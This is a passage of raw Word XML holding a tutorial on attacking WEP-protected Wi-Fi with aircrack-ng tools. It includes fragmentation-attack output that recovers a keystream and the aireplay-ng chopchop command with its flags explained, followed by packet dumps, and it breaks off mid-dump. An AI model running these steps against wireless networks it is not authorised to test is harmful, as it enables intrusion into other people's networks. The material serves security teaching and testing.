      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697F70C5"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0x0070:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>9c9f                                     ..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="591628A8"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
    <w:p w14:paraId="42228EDF" w14:textId="77777777" w:rsidR="00EB60F0"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Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="42CFD2AF"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p>
    <w:p w14:paraId="39D25CF7"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When a packet from the access point arrives, enter “y” to proceed. You may need to try a few different packets from the AP to be successful. These packets have ”“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>: 1”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56453DF4"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When successful, the system responds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3966ABC2"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Saving chosen packet in replay_src-0203-180328.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D7FD74"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Data packet found!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23232C06"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Sending fragmented packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175CB6B4"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Got RELAYED packet!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD9C6AB"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roofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Thats</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> our ARP packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA77F8F"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Trying to get 384 bytes of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="07D5914E"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Got RELAYED packet!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273416A8"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roofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Thats</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> our ARP packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14560326"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Trying to get 1500 bytes of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="42C393A9"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Got RELAYED packet!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64047F7A"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roofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Thats</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> our ARP packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9B574B"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Saving </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in fragment-0203-180343.xor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3170A845" w14:textId="77777777" w:rsidR="00EB60F0"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Now you can build a packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> out of that 1500 bytes </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="49F4389B"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p>
    <w:p w14:paraId="392C6E79" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7896DB77" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002463D1" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Success! The file “fragment-0203-180343.xor” can then be used in the next step</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6E5752" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A18BEA0"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If the fragmentation attack was not successful, you can then try the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> technique next. Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2255F82A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="571E166F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0070331F" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0070331F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>CHOPCHOP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384F7C7D" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C678AEB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F37B2B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B494C77"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160724B6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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-4 means the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B18056D" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5394FFFC" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162D5B23" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650E1977"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The system responds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F3DC92"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Read 165 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E61ADEB"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p>
    <w:p w14:paraId="345A0B41"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Size: 86, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6E9241"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
    <w:p w14:paraId="15EDB90F"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5BE12839"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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="67D10040"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:40:F4:77:E5:C9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="58038684"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
    <w:p w14:paraId="1A4C6C0B"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0x0000:  0842 0000 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0014 6c7e 4080  .B..........l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D99FAB"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0x0010:  0040 f477 e5c9 603a d600 0000 5fed </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>a222  .@.w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..`</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_.."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CF030B"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0x0020:  e2ee aa48 8312 f59d c8c0 af5f 3dd8 a543  ...H</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_=..C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB47F03"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0x0030:  d1ca 0c9b 6aeb fad6 f394 2591 5bf4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
